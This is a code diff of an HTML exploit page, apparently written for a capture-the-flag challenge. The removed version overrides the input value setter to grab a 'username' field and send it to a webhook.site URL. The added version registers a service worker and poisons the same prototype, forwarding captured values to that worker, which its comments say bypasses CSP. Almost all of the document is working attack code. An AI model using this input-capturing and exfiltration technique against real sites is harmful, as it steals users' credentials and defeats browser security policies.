@@ -1,30 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF Exploit</title>
+    <title>Exploit Loader</title>
 </head>
 <body>
-    <h1>Exploit is running... The bot is mine.</h1>
+    <h1>Service Worker is being registered... Exploit is armed.</h1>
     <script>
-        const WEBHOOK_URL = "https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf";
+        // Регистрируем Service Worker. Он должен лежать в том же каталоге.
+        navigator.serviceWorker.register('sw.js').then(reg => {
+            console.log('Service worker registration successful:', reg);
 
-        const originalDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
-
-        Object.defineProperty(HTMLInputElement.prototype, 'value', {
-            set: function(value) {
-                console.log(`Input field '${this.name}' is being set with value: ${value}`);
-
-                if (this.name === 'username') {
-                    console.log(`FLAG CAPTURED: ${value}`);
-                    
-                    window.location = `${WEBHOOK_URL}?flag=${encodeURIComponent(value)}`;
-                }
+            // Ждем, пока SW будет готов к приему сообщений
+            navigator.serviceWorker.ready.then(() => {
+                console.log('Service worker is active. Poisoning HTMLInputElement prototype...');
                 
-                return originalDescriptor.set.apply(this, arguments);
-            },
-            get: function() {
-                return originalDescriptor.get.apply(this, arguments);
-            }
+                // Сохраняем оригинальное поведение свойства 'value'
+                const originalDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
+
+                // Переопределяем свойство 'value'
+                Object.defineProperty(HTMLInputElement.prototype, 'value', {
+                    // Создаем свой сеттер, который сработает при попытке записи в <input>
+                    set: function(value) {
+                        // Нас интересует только поле 'username', и мы должны быть уверены, что SW активен
+                        if (this.name === 'username' && navigator.serviceWorker.controller) {
+                            console.log(`[EXPLOIT] FLAG CAPTURED: ${value}`);
+                            
+                            // Отправляем флаг в Service Worker, обходя CSP!
+                            navigator.serviceWorker.controller.postMessage(value);
+                        }
+                        
+                        // Вызываем оригинальный сеттер, чтобы не нарушать работу страницы
+                        originalDescriptor.set.apply(this, arguments);
+                    },
+                    // Возвращаем оригинальный геттер
+                    get: function() {
+                        return originalDescriptor.get.apply(this, arguments);
+                    }
+                });
+
+                console.log('Prototype is poisoned. Waiting for the bot...');
+            });
+
+        }).catch(err => {
+            console.error('Service worker registration failed: ', err);
         });
     </script>
 </body>
